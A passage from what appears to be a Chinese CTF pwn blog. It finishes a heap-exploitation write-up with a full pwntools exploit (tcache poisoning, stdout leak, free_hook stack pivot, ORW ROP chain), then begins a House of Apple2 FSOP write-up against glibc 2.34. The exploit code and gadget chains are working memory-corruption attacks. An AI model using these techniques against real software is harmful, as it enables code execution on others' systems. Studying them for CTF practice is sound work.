&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">      size = input_num();</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0xE7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(chunk, <span class="number">0</span>, size);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个函数可以置空 tcache key，但只能执行一次</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序拥有一次任意写的机会，但是没有泄露，对于这种要爆破的程序，建议先关地址随机化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>
<p>只能先打 stdout 泄露 libc，思路如下：</p>
<ul>
<li>先利用 double free 错位写一个 free tcache</li>
<li>伪造它的 presize，size(较大值)，FD(覆盖低位)</li>
<li>把它申请出来然后释放，就可以得到 unsorted chunk</li>
<li>先申请一次 unsorted chunk，并将 main_arena 覆盖为 stdout </li>
<li>如果堆风水够好的话，就会发现 stdout 在 tcache[0x70] 中（最好是这种情况，我也尝试过用 unsorted chunk 来覆盖其他的 free tcache，结果总是超出“申请模块”的次数限制）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x70</span> [  <span class="number">6</span>]: <span class="number">0x55555555b800</span> —▸ <span class="number">0x7ffff7f896a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> —▸ <span class="number">0x55555555b980</span> —▸ <span class="number">0x55555555bc10</span> —▸ <span class="number">0x55555555bec0</span> —▸ <span class="number">0x55555555ba90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>完成泄露以后，就可以利用现成的 unsorted chunk 来修改与其重叠的 free tcache，把 free_hook 写入到 tcachebin 中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x80</span> [  <span class="number">5</span>]: <span class="number">0x55555555b870</span> —▸ <span class="number">0x7ffff7f8bb28</span> (__free_hook) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>最后就是一个堆上 ORW 的过程了，因为没有泄露堆地址，所以常规的 <code>setcontext+61</code> 和 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code> 都没有作用，只能用特殊的 magic gadget 来进行栈迁移</p>
<p>我们先在 <code>free_hook</code> 的位置写一个 <code>puts</code>，然后分析寄存器的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br><span class="line"> RBX  <span class="number">0x555555555950</span> ◂— endbr64 </span><br><span class="line">*RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0xfffffffffffffffe</span></span><br><span class="line">*RDI  <span class="number">0x7ffff7f8bb28</span> (__free_hook) —▸ <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br><span class="line">*RSI  <span class="number">0x555555555778</span> ◂— lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*R8   <span class="number">0x1999999999999999</span></span><br><span class="line">*R9   <span class="number">0x0</span></span><br><span class="line">*R10  <span class="number">0x7ffff7f3bac0</span> (_nl_C_LC_CTYPE_toupper+<span class="number">512</span>) ◂— <span class="number">0x100000000</span></span><br><span class="line">*R11  <span class="number">0x7ffff7f3c3c0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— <span class="number">0x2000200020002</span></span><br><span class="line"> R12  <span class="number">0x555555555240</span> ◂— endbr64 </span><br><span class="line"> R13  <span class="number">0x7fffffffdf50</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line">*RBP  <span class="number">0x7fffffffde40</span> —▸ <span class="number">0x7fffffffde60</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffde28</span> —▸ <span class="number">0x555555555778</span> ◂— lea    rax, [rip + <span class="number">0x2899</span>]</span><br><span class="line">*RIP  <span class="number">0x7ffff7e245a0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>只有 RDI 寄存器可以利用</li>
<li>因此我们要把 ORW 链写入 <code>free_hook</code>，然后利用 RDI 寄存器来进行栈迁移</li>
<li>首先，在完成栈迁移之前我们不能使用栈，因此需要 <code>call</code> 来连接 gadget：（可以先把带有 <code>call</code> 的 gadget 保存到另一个文件中，然后搜索 RDI）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, qword ptr [rdi + <span class="number">8</span>]; call qword ptr [rax + <span class="number">0x30</span>]; </span><br></pre></td></tr></table></figure>
<ul>
<li>想这种基于 RAX 的 <code>call</code> 我们一般不采用，虽然它很多，但是很难进行栈迁移</li>
<li>我们通常使用 RDI，RSI，RDX，RBP 这4个寄存器来做栈迁移，因此优先使用带有它们的 <code>call</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]; mov qword ptr [rsp], rax; call qword ptr [rdx + <span class="number">0x20</span>]; </span><br><span class="line">mov rsp, rdx; ret; </span><br></pre></td></tr></table></figure>
<p>由于写入长度受限，我们需要手动执行一次 <code>gets</code> 写入 ORW 链</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./only&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">local = 1</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">    p = process(challenge)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;172.51.221.20&#x27;,&#x27;9999&#x27;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1B0A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">num</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>():</span></span><br><span class="line">    choice(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>():</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0xe0</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    fill()</span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;stdout &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]))</span><br><span class="line">    _IO_2_1_stdout_offset = <span class="number">0x96a0</span></span><br><span class="line">    head_offset = <span class="number">0xb7f0</span></span><br><span class="line">    head_offset2 = <span class="number">0xb800</span></span><br><span class="line">   </span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p16(head_offset))</span><br><span class="line">    add(<span class="number">0xe0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x491</span>)+p16(head_offset2))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    dele()</span><br><span class="line">    add(<span class="number">0x30</span>, p16(_IO_2_1_stdout_offset))</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00\n&#x27;</span></span><br><span class="line">    add(<span class="number">0x60</span>, payload)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook = libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    puts_libc = libc_base+libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    gets_libc = libc_base+libc.sym[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))  </span><br><span class="line">    </span><br><span class="line">    gadget1 = libc_base + <span class="number">0x00000000001547a0</span></span><br><span class="line">    <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    gadget2 = libc_base + <span class="number">0x000000000005e650</span></span><br><span class="line">    <span class="comment"># mov rsp, rdx; ret; </span></span><br><span class="line">    gadget3 = libc_base + <span class="number">0x000000000004a5c5</span></span><br><span class="line">    <span class="comment"># add rsp, 0x28; ret; </span></span><br><span class="line">    success(<span class="string">&quot;gadget1 &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(gadget1))</span><br><span class="line"></span><br><span class="line">    pop_rax_ret = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">    pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011c1e1</span></span><br><span class="line">    syscall_ret = libc_base + <span class="number">0x0000000000066229</span></span><br><span class="line">    success(<span class="string">&quot;syscall_ret &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(syscall_ret))</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0x81</span>) + p64(free_hook) </span><br><span class="line">    add(<span class="number">0xe0</span>, payload)</span><br><span class="line"></span><br><span class="line">    flag_addr = free_hook + <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">    ORW =  <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="comment"># open(bss_addr,0)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line">    <span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">    ORW += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">    ORW += p64(pop_rsi_ret) + p64(flag_addr+<span class="number">0x300</span>)</span><br><span class="line">    ORW += p64(pop_rdx_r12_ret) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    ORW += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload = p64(gadget1) + p64(free_hook+<span class="number">0x10</span>) </span><br><span class="line">    payload += p64(gadget3) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(gadget2) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(free_hook+<span class="number">0x50</span>) + p64(gets_libc)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    add(<span class="number">0x70</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    dele()</span><br><span class="line"></span><br><span class="line">    p.sendline(ORW)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    elf = ELF(challenge)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(challenge,timeout=<span class="number">1</span>)</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">elf = ELF(challenge)</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">p = process(challenge)</span></span><br><span class="line"><span class="string">pwn()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/10/House%20Of%20Apple-2.34-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/10/House%20Of%20Apple-2.34-64/" class="post-title-link" itemprop="url">House Of Apple-2.34-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-10 02:25:44 / Modified: 02:30:25" itemprop="dateCreated datePublished" datetime="2022-11-10T02:25:44+08:00">2022-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>6.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>oneday</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(GNU libc)</span> stable release version 2.34.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">oneday: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=f0ed246b7bd4e5f07caab6ba718a7e0e05c918b7, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 <code>execve</code></li>
</ul>
<p><strong>入侵思路</strong></p>
<p>使用 House Of Apple2：</p>
<ul>
<li>先用一个 largebin attack 来劫持 <code>stderr _IO_FILE</code> </li>
<li>完成 House Of Apple2 的伪造</li>
<li>main 函数返回后执行 <code>exit</code>，触发 IO 流</li>
</ul>
<p>这其中需要注意一个问题，该程序只有一次输出的机会，也就是说 largebin attack 和 <code>_IO_FILE</code> 的伪造必须放入用一个 chunk 中</p>
<p>但 largebin attack 的效果是把 unsorted chunk 放入 <code>_IO_list_all</code>，那么就必须先利用堆风水让 unsorted chunk 和 large chunk 重叠</p>
<ul>
<li>具体的方法就是释放遗留在 chunk_list 中的 chunk 指针（向 large chunk 写入数据时，就要伪造目标 chunk，使其合法）</li>
</ul>
<p>调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span> -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; target</span><br></pre></td></tr></table></figure>
<p>本题目还需要一个特殊的 gadget 来劫持程序流 <code>libc.sym[&#39;svcudp_reply&#39;]+26</code>，它的效果和 <code>setcontext+61</code> 类似，但它需要控制 RDI 寄存器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f02e97842ba</span> &lt;svcudp_reply+<span class="number">26</span>&gt;    mov    rbp, qword ptr [rdi + <span class="number">0x48</span>]</span><br><span class="line">  <span class="number">0x7f02e97842be</span> &lt;svcudp_reply+<span class="number">30</span>&gt;    mov    rax, qword ptr [rbp + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c2</span> &lt;svcudp_reply+<span class="number">34</span>&gt;    lea    r13, [rbp + <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x7f02e97842c6</span> &lt;svcudp_reply+<span class="number">38</span>&gt;    mov    dword ptr [rbp + <span class="number">0x10</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x7f02e97842cd</span> &lt;svcudp_reply+<span class="number">45</span>&gt;    mov    rdi, r13</span><br><span class="line">  <span class="number">0x7f02e97842d0</span> &lt;svcudp_reply+<span class="number">48</span>&gt;    call   qword ptr [rax + <span class="number">0x28</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>由于本题目没法控制 RDX 寄存器，因此才用这种方式来替代 <code>setcontext+61</code></li>
<li>RDI 寄存器其实就指向 <code>fake_IO_FILE</code> 的起始地址，也就是 <code>fake_io_addr</code></li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 